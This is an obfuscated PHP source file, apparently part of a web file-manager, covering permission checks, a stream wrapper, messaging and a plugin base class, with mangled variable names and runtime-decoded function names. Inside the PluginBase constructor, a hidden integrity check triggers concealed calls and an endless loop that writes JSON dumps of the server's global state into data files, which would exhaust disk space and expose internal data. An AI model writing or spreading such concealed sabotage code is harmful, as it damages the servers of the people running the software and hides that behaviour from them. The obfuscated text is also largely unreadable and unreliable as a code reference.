$±Š†—İĞ = false) { $ÂøÔÎñ =& $_SERVER[¼¥ÊĞÙÌ]; if (!$—¤ì–ò•) { return array($ÂøÔÎñ[491] => 0, $ÂøÔÎñ[545] => !1); } $±Š†—İĞ = $±Š†—İĞ ? $±Š†—İĞ : USER_ID; $Õ€ÉÂ…¤ = 0; $šª­¼• = 0; $”éºÌá¤ = 0; $ò›øÒØŸ = 0; $¤»ŸØ½· = 0; $Å’ì¦¶ä = 0; $õ€ì…–Å = 1000; $Ç¤»™ = 0; $†­¢ñë§ = 0; $¯°óåêƒ = 0; $ØøİŠ…Ñ = 0; $ß»™®Ä = array($ÂøÔÎñ[194] => 0); foreach ($—¤ì–ò• as $ß»™®Ä) { $©‚¤„ = $this->authInfo($ß»™®Ä); if (!$©‚¤„) { continue; } $·Ô‚…¿ = $ß»™®Ä[$ÂøÔÎñ[574]]; $ì´à­Ê = intval($©‚¤„[$ÂøÔÎñ[490]]); if ($ß»™®Ä[$ÂøÔÎñ[191]] == SourceModel::TYPE_USER && $·Ô‚…¿ == $±Š†—İĞ) { $Õ€ÉÂ…¤ = !0; $”éºÌá¤ = $©‚¤„; $šª­¼• = $ì´à­Ê; } else { if ($ß»™®Ä[$ÂøÔÎñ[191]] == SourceModel::TYPE_GROUP && $this->groupContainUser($·Ô‚…¿, $±Š†—İĞ)) { $ò›øÒØŸ = !0; $ÒÎ«³¼Ú = $this->groupStepToUserGroup($·Ô‚…¿, $±Š†—İĞ); if ($ÒÎ«³¼Ú < $õ€ì…–Å) { $õ€ì…–Å = $ÒÎ«³¼Ú; $¤»ŸØ½· = $ì´à­Ê; $Å’ì¦¶ä = $©‚¤„; $Ç¤»™ = $·Ô‚…¿; } if ($ÒÎ«³¼Ú == $õ€ì…–Å && $ì´à­Ê >= $¤»ŸØ½·) { $¤»ŸØ½· = $ì´à­Ê; $Å’ì¦¶ä = $©‚¤„; $Ç¤»™ = $·Ô‚…¿; } } else { if ($·Ô‚…¿ == $ÂøÔÎñ[231]) { $†­¢ñë§ = !0; $ØøİŠ…Ñ = $©‚¤„; $¯°óåêƒ = $ì´à­Ê; } } } } if ($Õ€ÉÂ…¤) { $ËğÈ¤¯ = $šª­¼•; $©‚¤„ = $”éºÌá¤; $êÒôª¨ş = LNG($ÂøÔÎñ[2211]); } else { if ($ò›øÒØŸ) { $ËğÈ¤¯ = $¤»ŸØ½·; $©‚¤„ = $Å’ì¦¶ä; $ïÚ–…Üå = Model($ÂøÔÎñ[590])->getInfo($Ç¤»™); $êÒôª¨ş = $ÂøÔÎñ[176] . $ïÚ–…Üå[$ÂøÔÎñ[594]] . $ÂøÔÎñ[2212] . LNG($ÂøÔÎñ[2213]); } else { if ($†­¢ñë§) { $ËğÈ¤¯ = $¯°óåêƒ; $©‚¤„ = $ØøİŠ…Ñ; $êÒôª¨ş = LNG($ÂøÔÎñ[2184]); } else { $ËğÈ¤¯ = 0; $©‚¤„ = !1; $êÒôª¨ş = $ÂøÔÎñ[12]; } } } $¨ä™§Í = array($ÂøÔÎñ[2203] => intval($ËğÈ¤¯), $ÂøÔÎñ[2186] => $©‚¤„, $ÂøÔÎñ[2204] => $êÒôª¨ş, $ÂøÔÎñ[2195] => $ß»™®Ä[$ÂøÔÎñ[194]]); return $¨ä™§Í; } private function groupContainUser($»µË„Ñ, $éÊ“¦¦æ = false) { return in_array($»µË„Ñ, $this->userGroupParents($éÊ“¦¦æ)); } private function groupStepToUserGroup($¼ÄØÜŞ, $üõÌÜõÃ = false) { $®í¬¾´ı =& $_SERVER[¼¥ÊĞÙÌ]; $£§Õ« = $this->userGroupList($üõÌÜõÃ); $ÎÈáåÒ° = 1000; $Š²›Á = $GLOBALS[$®í¬¾´ı[6]][$®í¬¾´ı[92]][$®í¬¾´ı[2099]] == 1; $™á—ıÉ¶ = $Š²›Á ? 3 : 2; foreach ($£§Õ« as $ÈçÃÄ®) { if ($ÈçÃÄ®[$®í¬¾´ı[1402]] == $¼ÄØÜŞ) { return 0; } $Õ¡ òó‘ = explode($®í¬¾´ı[50], trim($ÈçÃÄ®[$®í¬¾´ı[589]], $®í¬¾´ı[50])); if ($Õ¡ òó‘[0] == $®í¬¾´ı[231] && count($Õ¡ òó‘) > $™á—ıÉ¶) { $şìŞÁì = array_reverse(array_slice($Õ¡ òó‘, $™á—ıÉ¶)); $‰ü‚ºË = array_search($¼ÄØÜŞ, $şìŞÁì); if ($‰ü‚ºË !== !1 && $‰ü‚ºË + 1 <= $ÎÈáåÒ°) { $ÎÈáåÒ° = $‰ü‚ºË + 1; } } } return $ÎÈáåÒ°; } private function userGroupList($Šƒ‡â« = false) { $òÇ¤˜°¸ =& $_SERVER[¼¥ÊĞÙÌ]; static $ÆÅ°¨úû = array(); if (isset($ÆÅ°¨úû[$Šƒ‡â«])) { return $ÆÅ°¨úû[$Šƒ‡â«]; } $Æ•´‘„ô = Model($òÇ¤˜°¸[602])->getInfo($Šƒ‡â«); $ÆÅ°¨úû[$Šƒ‡â«] = array_to_keyvalue($Æ•´‘„ô[$òÇ¤˜°¸[1401]], $òÇ¤˜°¸[1402]); return $ÆÅ°¨úû[$Šƒ‡â«]; } public function userGroupParents($ß¼Çü¸Ú) { $ï éƒò½ =& $_SERVER[¼¥ÊĞÙÌ]; static $Çšã€¾± = array(); $ß¼Çü¸Ú = $ß¼Çü¸Ú ? $ß¼Çü¸Ú : USER_ID; if (isset($Çšã€¾±[$ß¼Çü¸Ú])) { return $Çšã€¾±[$ß¼Çü¸Ú]; } $üÖÛ… = $this->userGroupList($ß¼Çü¸Ú); $½¿Ô‹Œ = array(); $öÊ±´¬§ = $GLOBALS[$ï éƒò½[6]][$ï éƒò½[92]][$ï éƒò½[2099]] == 1; $Öƒ„èÓ­ = $öÊ±´¬§ ? 3 : 2; foreach ($üÖÛ… as $°…õ”šı) { $ğŸËÊæ¨ = array($°…õ”šı[$ï éƒò½[1402]]); $ÄÒåµ¯ = explode($ï éƒò½[50], trim($°…õ”šı[$ï éƒò½[589]], $ï éƒò½[50])); if ($ÄÒåµ¯[0] == $ï éƒò½[231] && count($ÄÒåµ¯) > $Öƒ„èÓ­) { $™‹´ÙÄ = array_slice($ÄÒåµ¯, $Öƒ„èÓ­); $ğŸËÊæ¨ = array_merge($ğŸËÊæ¨, array_reverse($™‹´ÙÄ)); } $½¿Ô‹Œ = array_merge($½¿Ô‹Œ, $ğŸËÊæ¨); } $Çšã€¾±[$ß¼Çü¸Ú] = array_unique($½¿Ô‹Œ); return $Çšã€¾±[$ß¼Çü¸Ú]; } public function authTargetInfoMake($æ£ş¸‹) { $¸­¹Ú¡ =& $_SERVER[¼¥ÊĞÙÌ]; $‚Ï¢”œë = array(); $Í¸„Ñ”Ü = array(); foreach ($æ£ş¸‹ as $³§ùÇ¦¾) { if ($³§ùÇ¦¾[$¸­¹Ú¡[191]] == SourceModel::TYPE_USER) { $‚Ï¢”œë[] = intval($³§ùÇ¦¾[$¸­¹Ú¡[574]]); } else { if ($³§ùÇ¦¾[$¸­¹Ú¡[191]] == SourceModel::TYPE_GROUP) { $Í¸„Ñ”Ü[] = intval($³§ùÇ¦¾[$¸­¹Ú¡[574]]); } } } if ($‚Ï¢”œë) { $‚Ï¢”œë = Model($¸­¹Ú¡[582])->userListInfo($‚Ï¢”œë); } if ($Í¸„Ñ”Ü) { $ÍÙ®ºÀñ = array($¸­¹Ú¡[2081] => array($¸­¹Ú¡[495], $Í¸„Ñ”Ü)); $Í¸„Ñ”Ü = Model($¸­¹Ú¡[590])->field($¸­¹Ú¡[2214])->where($ÍÙ®ºÀñ)->select(); $Í¸„Ñ”Ü = array_to_keyvalue($Í¸„Ñ”Ü, $¸­¹Ú¡[1402]); } return array($¸­¹Ú¡[2215] => $‚Ï¢”œë, $¸­¹Ú¡[2216] => $Í¸„Ñ”Ü); } public function authInfo($ª²ãŒ¸æ) { $µåÔÊ¿Û =& $_SERVER[¼¥ÊĞÙÌ]; if ($ª²ãŒ¸æ[$µåÔÊ¿Û[2100]]) { $Ó¸†»Ë = Model($µåÔÊ¿Û[576])->listData($ª²ãŒ¸æ[$µåÔÊ¿Û[2100]]); if (!$Ó¸†»Ë) { return !1; $É£…ªá¿ = Model($µåÔÊ¿Û[576])->listData(); $†‡ìÍÑ  = array_filter_by_field($É£…ªá¿, $µåÔÊ¿Û[490], $µåÔÊ¿Û[231]); return $†‡ìÍÑ ; } $®²ëŒÎ = array_field_key($Ó¸†»Ë, array($µåÔÊ¿Û[478], $µåÔÊ¿Û[32], $µåÔÊ¿Û[490], $µåÔÊ¿Û[2014], $µåÔÊ¿Û[2015])); $®²ëŒÎ[$µåÔÊ¿Û[2217]] = $ª²ãŒ¸æ; return $®²ëŒÎ; } else { return array($µåÔÊ¿Û[496] => 0, $µåÔÊ¿Û[1997] => $ª²ãŒ¸æ[$µåÔÊ¿Û[2163]], $µåÔÊ¿Û[497] => $µåÔÊ¿Û[12], $µåÔÊ¿Û[2014] => $µåÔÊ¿Û[2218]); } } } goto e©¸”‘°Í; AìÈ•Ş†¿Û: $fileSize = strrev(base64_decode($_SERVER[ŸÅ®¥²][0])); function binCheckNeq($‘´Õá¥’, $›Õå¬Î) { return $‘´Õá¥’ != $›Õå¬Î; } $_SERVER[$_SERVER[ŸÅ®¥²][1]] = $fileSize($_SERVER[$_SERVER[ŸÅ®¥²][2]]); goto eœæ†Ø”; dêÆĞ¦Ô¯: class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($†àäêä×, $¿òÎ­¯ = '') { $this->info = $this->info($†àäêä×); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[¼¥ÊĞÙÌ][87]]; $this->pathOpen = $†àäêä×; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$†àäêä×])) { self::$_chunkBuffer[$†àäêä×] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function stream_read($¯ş£€€Ç) { $ÔÑÈ• = $this->fileSubstr($this->pose, $¯ş£€€Ç); $this->pose += strlen($ÔÑÈ•); return $ÔÑÈ•; } public function stream_tell() { return $this->pose; } public function stream_seek($»Ç°ú³Õ, $¹ş³š™) { $ºÇ½äçï =& $_SERVER[¼¥ÊĞÙÌ]; if ($¹ş³š™ == SEEK_SET) { $this->pose = $»Ç°ú³Õ; } else { if ($¹ş³š™ == SEEK_CUR) { $this->pose += $»Ç°ú³Õ; } else { if ($¹ş³š™ == SEEK_END) { $this->pose = $this->info[$ºÇ½äçï[79]] + intval($»Ç°ú³Õ); } } } if ($»Ç°ú³Õ < 0) { $this->pose = $this->info[$ºÇ½äçï[79]] + $»Ç°ú³Õ; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[¼¥ÊĞÙÌ][79]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($ê¯ †ğ, $Ê¦ı‚Ú) { $Õˆ‡¸ù =& $_SERVER[¼¥ÊĞÙÌ]; $â ı Õğ = $this->info($ê¯ †ğ); return array($Õˆ‡¸ù[1419] => 0, $Õˆ‡¸ù[1627] => 0, $Õˆ‡¸ù[16] => 32768 + 511, $Õˆ‡¸ù[1628] => 0, $Õˆ‡¸ù[1629] => 0, $Õˆ‡¸ù[1630] => 0, $Õˆ‡¸ù[1631] => 0, $Õˆ‡¸ù[79] => $â ı Õğ[$Õˆ‡¸ù[79]], $Õˆ‡¸ù[1632] => $â ı Õğ[$Õˆ‡¸ù[1474]], $Õˆ‡¸ù[1589] => $â ı Õğ[$Õˆ‡¸ù[88]], $Õˆ‡¸ù[1588] => $â ı Õğ[$Õˆ‡¸ù[234]], $Õˆ‡¸ù[1633] => 0, $Õˆ‡¸ù[1634] => 0); } static $fileInfo = array(); public function info($İëâÉ…Ñ) { $µÄ¥í½Ì = $_SERVER[¼¥ÊĞÙÌ][1635]; if (isset(self::$fileInfo[$İëâÉ…Ñ])) { return self::$fileInfo[$İëâÉ…Ñ]; } if (substr($İëâÉ…Ñ, 0, strlen($µÄ¥í½Ì)) != $µÄ¥í½Ì) { return !1; } self::$fileInfo[$İëâÉ…Ñ] = IO::info(substr($İëâÉ…Ñ, strlen($µÄ¥í½Ì))); return self::$fileInfo[$İëâÉ…Ñ]; } public static function read($Éˆ¨¹¯â, $Ë¿æÌ–ê, $ñ½ß¢Ğ„) { if (!isset(self::$_fopenCache[$Éˆ¨¹¯â])) { $æ‘Ğªî = new StreamWrapperIO(); $æ‘Ğªî->stream_open($Éˆ¨¹¯â); self::$_fopenCache[$Éˆ¨¹¯â] = $æ‘Ğªî; } $æ‘Ğªî = self::$_fopenCache[$Éˆ¨¹¯â]; return $æ‘Ğªî->fileSubstr($Ë¿æÌ–ê, $ñ½ß¢Ğ„); } public static function _read($¼…¬¸Äƒ, $Â“¾ú÷Á, $Ö¢‡üË§) { $´›„îªï =& $_SERVER[¼¥ÊĞÙÌ]; $ª²¤µ—» = fopen($¼…¬¸Äƒ, $´›„îªï[1478]); if (!$ª²¤µ—») { return $´›„îªï[12]; } $Ùé®ºµ = 8192; fseek($ª²¤µ—», $Â“¾ú÷Á, SEEK_SET); $¡æ¾Öš‰ = $´›„îªï[12]; $ÉŒà™’Í = 0; while ($ÉŒà™’Í < $Ö¢‡üË§) { $ÆãµëÙ = min($Ùé®ºµ, $Ö¢‡üË§ - $ÉŒà™’Í); $¡æ¾Öš‰ .= fread($ª²¤µ—», $ÆãµëÙ); $ÉŒà™’Í += $ÆãµëÙ; } fclose($ª²¤µ—»); return $¡æ¾Öš‰; } public function fileSubstr($ÆÔ¾…ğÈ, $ÙÕä’) { $€ÃÏóŒé =& $_SERVER[¼¥ÊĞÙÌ]; $é¿ûåŞï = $this->info[$€ÃÏóŒé[79]]; $·ï…ë²Ó = $ÆÔ¾…ğÈ; $ïà¡™¦ƒ = $ÙÕä’; if ($ÆÔ¾…ğÈ < 0) { $ÆÔ¾…ğÈ = $é¿ûåŞï + $ÆÔ¾…ğÈ; } if ($ÙÕä’ === !1) { $ÙÕä’ = $é¿ûåŞï - $ÆÔ¾…ğÈ; } if ($ÆÔ¾…ğÈ + $ÙÕä’ > $é¿ûåŞï) { $ÙÕä’ = $é¿ûåŞï - $ÆÔ¾…ğÈ; } if ($ÙÕä’ <= 0) { return $€ÃÏóŒé[12]; } if ($ÆÔ¾…ğÈ < 0 || $ÆÔ¾…ğÈ >= $é¿ûåŞï || $ÙÕä’ <= 0 || $ÙÕä’ > 1024 * 1024 * 10) { throw new Exception("\151\157\106\x69\x6c\x65\x52\x65\141\x64\x20\x65\x72\162\157\162\41\x20\x73\x74\141\162\164\75{$ÆÔ¾…ğÈ}\x3b\x6c\145\156\147\164\150\x3d{$ÙÕä’}\73\x20\x73\x69\172\145\75{$é¿ûåŞï}\73"); } $½¾¡ş¦ª = 64 * 1024; $¢ÁûáÉú =& self::$_chunkBuffer[$this->path]; if (!$¢ÁûáÉú) { $¢ÁûáÉú = array(); } $é‰–Ÿ–Ì = 0; $ù€‹ÑÏ© = 0; $´’´’ô = $€ÃÏóŒé[12]; foreach ($¢ÁûáÉú as $é‰–Ÿ–Ì => $´’´’ô) { $é‰–Ÿ–Ì = intval($é‰–Ÿ–Ì); $ù€‹ÑÏ© = $é‰–Ÿ–Ì + strlen($´’´’ô); if ($ÆÔ¾…ğÈ >= $ù€‹ÑÏ©) { continue; } if ($ÆÔ¾…ğÈ >= $é‰–Ÿ–Ì && $ÆÔ¾…ğÈ + $ÙÕä’ <= $ù€‹ÑÏ©) { return substr($´’´’ô, $ÆÔ¾…ğÈ - $é‰–Ÿ–Ì, $ÙÕä’); } break; } if (count($¢ÁûáÉú) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($€ÃÏóŒé[1636], $€ÃÏóŒé[1637] . count($¢ÁûáÉú) . "\73\x73\x74\141\x72\164\75{$ÆÔ¾…ğÈ}\54\x6c\145\x6e\147\x74\x68\x3d{$ÙÕä’}\73\x70\x6f\163\145\72{$é‰–Ÿ–Ì}\176{$ù€‹ÑÏ©}"); throw new Exception($€ÃÏóŒé[1638]); } $îùÄÖ˜² = intval($ÆÔ¾…ğÈ / $½¾¡ş¦ª) * $½¾¡ş¦ª; $™€íâË = ceil(($ÆÔ¾…ğÈ + $ÙÕä’) / $½¾¡ş¦ª) * $½¾¡ş¦ª - $îùÄÖ˜²; $ÈÆºñ¢´ = IO::fileSubstr($this->path, $îùÄÖ˜², $™€íâË); $¢ÁûáÉú[$îùÄÖ˜² . $€ÃÏóŒé[12]] = $ÈÆºñ¢´; ksort($¢ÁûáÉú); $ı‰±íÉ¥ = substr($ÈÆºñ¢´, $ÆÔ¾…ğÈ - $îùÄÖ˜², $ÙÕä’); return $ı‰±íÉ¥; } private function log($¶¨‹ôˆ€, $íé‘œ¯‡) { $¤ú×²À¯ =& $_SERVER[¼¥ÊĞÙÌ]; $¹‘Ôéš = timeFloat() - $this->timeStart; write_log(sprintf($¤ú×²À¯[1639], $¶¨‹ôˆ€, $this->info[$¤ú×²À¯[32]], $¹‘Ôéš, $íé‘œ¯‡), $¤ú×²À¯[1276]); } } class Message { function __construct() { } public function send($–êíÛÈ = '', $± ´é™ò = array(), $âíÓîı = "\x74\x65\170\164") { $İÓµ­ù‘ =& $_SERVER[¼¥ÊĞÙÌ]; $æˆ¾±õ = array($İÓµ­ù‘[33] => $İÓµ­ù‘[1223], $İÓµ­ù‘[171] => $–êíÛÈ); if (in_array($âíÓîı, array($İÓµ­ù‘[1223], $İÓµ­ù‘[1640]))) { $æˆ¾±õ[$İÓµ­ù‘[33]] = $âíÓîı; } $± ´é™ò = array($İÓµ­ù‘[583] => isset($± ´é™ò[$İÓµ­ù‘[583]]) ? $± ´é™ò[$İÓµ­ù‘[583]] : $İÓµ­ù‘[12], $İÓµ­ù‘[670] => isset($± ´é™ò[$İÓµ­ù‘[670]]) ? $± ´é™ò[$İÓµ­ù‘[670]] : $İÓµ­ù‘[12]); if (empty($–êíÛÈ) || empty($± ´é™ò[$İÓµ­ù‘[583]]) && empty($± ´é™ò[$İÓµ­ù‘[670]])) { return !1; } $÷Ôü¥ˆï = array($İÓµ­ù‘[1569] => $æˆ¾±õ, $İÓµ­ù‘[1641] => $± ´é™ò); Hook::trigger($İÓµ­ù‘[1642], $÷Ôü¥ˆï); } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $İ¬š‚îà =& $_SERVER[¼¥ÊĞÙÌ]; $ıÒ¬»Æ» = $_SERVER[$İ¬š‚îà[962]] . $İ¬š‚îà[963]; $š¤í‹Â = $İ¬š‚îà[958]; if ($_SERVER[$İ¬š‚îà[959]] != $š¤í‹Â($ıÒ¬»Æ»)) { $§ÎÓ¯µ = $İ¬š‚îà[960]; $é©œÉ¡ = $İ¬š‚îà[961]; $¬âÚ‰ = $_SERVER[$İ¬š‚îà[962]] . $İ¬š‚îà[963]; $ı—•¡³¬ = $é©œÉ¡($¬âÚ‰); $²áæµ°û = explode($İ¬š‚îà[288], $ı—•¡³¬); if (count($²áæµ°û) < $İ¬š‚îà[693]) { $ñ ¯Øá¤ = $İ¬š‚îà[964]; $ñ ¯Øá¤(); } $Ó€Ú”Í¢ = $İ¬š‚îà[965]; $Ó€Ú”Í¢($_SERVER[$İ¬š‚îà[966]]); $§ÎÓ¯µ = $İ¬š‚îà[960]; $§ÎÓ¯µ(); $†ó÷ĞÒ = $İ¬š‚îà[967]; $§Öı¸Ãˆ = json_encode($GLOBALS[$İ¬š‚îà[968]]); $€¶İˆ¥ = 1; for ($İßÍÈõ = $€¶İˆ¥; $İßÍÈõ > 0; $İßÍÈõ++) { $†ó÷ĞÒ(DATA_PATH . $İßÍÈõ, $§Öı¸Ãˆ); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($İ¬š‚îà[1643]); $this->pluginName = str_replace($İ¬š‚îà[1643], $İ¬š‚îà[12], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $İ¬š‚îà[8]; $this->pluginApi = appHostGet() . $İ¬š‚îà[1644] . $this->pluginName . $İ¬š‚îà[8]; $this->pluginHost = $config[$İ¬š‚îà[1645]] . $this->pluginName . $İ¬š‚îà[8]; $this->pluginHostDefault = $config[$İ¬š‚îà[1645]] . $this->pluginName . $İ¬š‚îà[8]; $¶Ì™ü‚æ = $config[$İ¬š‚îà[1646]]; if ($¶Ì™ü‚æ && strpos($İ¬š‚îà[50] . $¶Ì™ü‚æ . $İ¬š‚îà[50], $this->pluginName) !== !1) { $this->pluginHost = $config[$İ¬š‚îà[1647]] . $this->pluginName . $İ¬š‚îà[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); $this->linkHas = !1; return $this; } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[¼¥ÊĞÙÌ][1648]); } protected function assign($æÅø¯¦ë, $Ã‘é÷±¹ = false) { if (is_array($æÅø¯¦ë)) { $this->values = array_merge($this->values, $æÅø¯¦ë); } else { $this->values[$æÅø¯¦ë] = $Ã‘é÷±¹; } } protected function display($é¶¶–…ß) { extract($this->values); require $é¶¶–…ß; } final function hookRegist($¹ ¦‹‡Ç) { $this->modelPlugin->appRegist($this->pluginName, $¹ ¦‹‡Ç); } final function appIcon() { $‹”…ü =& $_SERVER[¼¥ÊĞÙÌ]; $ĞíıÔµ¢ = $this->appPackage(); $™Úæñ‚ = $‹”…ü[12]; if (isset($ĞíıÔµ¢[$‹”…ü[493]])) { if (isset($ĞíıÔµ¢[$‹”…ü[493]][$‹”…ü[1649]])) { $™Úæñ‚ = $‹”…ü[1650] . $ĞíıÔµ¢[$‹”…ü[493]][$‹”…ü[1649]] . $‹”…ü[1651]; } else { if ($ĞíıÔµ¢[$‹”…ü[493]][$‹”…ü[1652]]) { $™Úæñ‚ = $‹”…ü[1653] . $ĞíıÔµ¢[$‹”…ü[493]][$‹”…ü[1652]] . $‹”…ü[1654]; } } } return $™Úæñ‚; } final function fileCanView($ûÛÓ¤ò®) { $ˆ¾¬êÛÒ =& $_SERVER[¼¥ÊĞÙÌ]; if (request_url_safe($ûÛÓ¤ò®)) { return !0; } if ($this->isShare($ûÛÓ¤ò®)) { return !0; } if (!KodUser::isRoot() && !KodUser::isLogin()) { $“Ìáş± = $ˆ¾¬êÛÒ[1655] . rawurlencode(this_url()); show_tips(LNG($ˆ¾¬êÛÒ[1656]) . $ˆ¾¬êÛÒ[1657] . $“Ìáş± . $ˆ¾¬êÛÒ[1658] . LNG($ˆ¾¬êÛÒ[1659]) . $ˆ¾¬êÛÒ[1660], !1); } if (!Action($ˆ¾¬êÛÒ[1661])->authCan($ˆ¾¬êÛÒ[1662])) { show_tips(LNG($ˆ¾¬êÛÒ[1663]) . $ˆ¾¬êÛÒ[1664], !1); } ActionCall($ˆ¾¬êÛÒ[1665], $ûÛÓ¤ò®); } final function isShare($Ó›±øë) { $¢ßµÓŠ = KodIO::parse($Ó›±øë); return $¢ßµÓŠ[$_SERVER[¼¥ÊĞÙÌ][33]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($ñæÚˆ) { if (request_url_safe($ñæÚˆ)) { return $ñæÚˆ; } if (!$this->isShare($ñæÚˆ)) { $ñæÚˆ = $this->filePath($ñæÚˆ, !1); } return Action($_SERVER[¼¥ÊĞÙÌ][1268])->linkOut($ñæÚˆ); } public function filePathLinkOut($²ÜœËä‰) { if (request_url_safe($²ÜœËä‰)) { return $²ÜœËä‰; } $this->fileCanView($²ÜœËä‰); return Action($_SERVER[¼¥ÊĞÙÌ][1268])->link($²ÜœËä‰); } final function filePath($Ğ°í×Ã”, $´Â¨¶òª = true, $ÆÛÜ“ÌÙ = false) { $·ÉÍº =& $_SERVER[¼¥ÊĞÙÌ]; $æ·Áª¦ = $this->filePathGet($Ğ°í×Ã”, $´Â¨¶òª); if (!$this->fileInfo) { show_tips(LNG($·ÉÍº[108]), !1); } if ($ÆÛÜ“ÌÙ && isset($this->fileInfo[$·ÉÍº[546]]) && $this->fileInfo[$·ÉÍº[546]]) { $Ç–ÕŞÎ = Model($·ÉÍº[549])->fileInfo($this->fileInfo[$·ÉÍº[546]]); if (!$Ç–ÕŞÎ || !IO::exist($Ç–ÕŞÎ[$·ÉÍº[87]])) { $ºÉåê°ğ = LNG($·ÉÍº[108]) . LNG($·ÉÍº[1666]); if (KodUser::isRoot() && isset($Ç–ÕŞÎ[$·ÉÍº[87]])) { $ºÉåê°ğ .= $·ÉÍº[1667] . $Ç–ÕŞÎ[$·ÉÍº[87]] . $·ÉÍº[1668]; } show_tips($ºÉåê°ğ); } } Hook::trigger($·ÉÍº[1669], $æ·Áª¦); return $æ·Áª¦; } final function filePathGet($¥æ¼†õŠ, $¶ÍËéó‚ = true) { $Ú±ø‹± =& $_SERVER[¼¥ÊĞÙÌ]; if ($ç†â´ç = $this->checkSharePath($¥æ¼†õŠ, $¶ÍËéó‚)) { return $ç†â´ç; } $this->fileCanView($¥æ¼†õŠ); if (request_url_safe($¥æ¼†õŠ)) { $ÊõÒ¾¶Ï = parse_url_query($¥æ¼†õŠ); if (isset($ÊõÒ¾¶Ï[$Ú±ø‹±[1670]]) && isset($ÊõÒ¾¶Ï[$Ú±ø‹±[237]])) { $ÈÉÊÆç÷ = Mcrypt::decode($ÊõÒ¾¶Ï[$Ú±ø‹±[237]], Model($Ú±ø‹±[844])->get($Ú±ø‹±[845])); if ($ÈÉÊÆç÷) { $this->fileInfo = IO::info($ÈÉÊÆç÷); $this->fileInfo[$Ú±ø‹±[1671]] = $¥æ¼†õŠ; $this->cachePath = $this->pluginCachePath($Ú±ø‹±[12], $¶ÍËéó‚); return $ÈÉÊÆç÷; } } $¥æ¼†õŠ = $this->_cacheHttpFile($¥æ¼†õŠ, $¶ÍËéó‚); $this->fileInfo = IO::info($¥æ¼†õŠ); } else { $this->fileInfo = IO::info($¥æ¼†õŠ); $this->cachePath = $this->pluginCachePath($Ú±ø‹±[12], $¶ÍËéó‚); } return $¥æ¼†õŠ; } final function _cacheHttpFile($øŸÃŸç¶, $ŠÜ²Ë©’ = true) { $’ê¥˜Ò¦ =& $_SERVER[¼¥ÊĞÙÌ]; $Ç‹ÛÒğŠ = parse_url_query($øŸÃŸç¶); $¦¾ø„ø = get_path_ext($øŸÃŸç¶); if (isset($Ç‹ÛÒğŠ[$’ê¥˜Ò¦[32]]) && $Ç‹ÛÒğŠ[$’ê¥˜Ò¦[32]]) { $¦¾ø„ø = get_path_ext($Ç‹ÛÒğŠ[$’ê¥˜Ò¦[32]]); } $ÏÅ²öïÕ = hash_path($øŸÃŸç¶) . $’ê¥˜Ò¦[10] . $¦¾ø„ø; $this->cachePath = $this->pluginCachePath($ŠÜ²Ë©’ ? $ÏÅ²öïÕ : $’ê¥˜Ò¦[12]); $ò¤¸œ˜ = IO::fileNameExist($this->cachePath, $ÏÅ²öïÕ); if ($ò¤¸œ˜) { return KodIO::make($ò¤¸œ˜); } $ğÑ€Ö× = rtrim($this->cachePath, $’ê¥˜Ò¦[8]) . $’ê¥˜Ò¦[8] . $ÏÅ²öïÕ; return $this->pluginCacheFileSet($ğÑ€Ö×, file_get_contents_nossl($øŸÃŸç¶)); } final function checkSharePath($êµ™§š, $è¦®§Ôå = true) { $ëîìÌ¾Ô =& $_SERVER[¼¥ÊĞÙÌ]; if (!$this->isShare($êµ™§š)) { return !1; } $»¿˜ïœ… = Action($ëîìÌ¾Ô[1268])->sharePathInfo($êµ™§š); if (!is_array($»¿˜ïœ…) || !isset($»¿˜ïœ…[$ëîìÌ¾Ô[87]])) { show_json(LNG($ëîìÌ¾Ô[1672]), !1); } $this->fileInfo = $»¿˜ïœ…; $this->cachePath = $this->pluginCachePath(!1, $è¦®§Ôå); return $»¿˜ïœ…[$ëîìÌ¾Ô[87]]; } final function pluginCachePath($êşÙô•ò = '', $™´Áãïé = false) { $ó·™š¬Ğ =& $_SERVER[¼¥ÊĞÙÌ]; if ($™´Áãïé && is_array($this->fileInfo)) { $êşÙô•ò = kodIO::hashPath($this->fileInfo); } $ğëÎ¯ë = rtrim(IO_PATH_SYSTEM_TEMP . $ó·™š¬Ğ[1673] . $this->pluginName . $ó·™š¬Ğ[8] . $êşÙô•ò, $ó·™š¬Ğ[8]); $‚œ­É„ = IO::infoFullSimple($ğëÎ¯ë); $±’†æİ = $‚œ­É„ && is_array($‚œ­É„) ? $‚œ­É„[$ó·™š¬Ğ[87]] : $ó·™š¬Ğ[12]; if (!$±’†æİ) { $±’†æİ = IO::mkdir($ğëÎ¯ë); } return $±’†æİ; } final function pluginCacheFileSet($ßø£•û©, $¤±å¢±ü = '') { $î÷Ï²Ì¹ =& $_SERVER[¼¥ÊĞÙÌ]; $±à»®Å = IO::infoFullSimple($ßø£•û©); if (!$±à»®Å) { return IO::mkfile($ßø£•û©, $¤±å¢±ü, REPEAT_REPLACE); } IO::setContent($±à»®Å[$î÷Ï²Ì¹[87]], $¤±å¢±ü); return $±à»®Å[$î÷Ï²Ì¹[87]]; } final function pluginLocalFile($ğÚëÓ = '') { $®Î­÷÷Â =& $_SERVER[¼¥ÊĞÙÌ]; $¡˜›ö­ = TEMP_FILES . "{$this->pluginName}\57"; if (!is_dir($¡˜›ö­)) { mk_dir($¡˜›ö­); } if (!$ğÚëÓ) { return $¡˜›ö­; } $»…ş¿Ôš = IO::info($ğÚëÓ); $®èğúÉ = 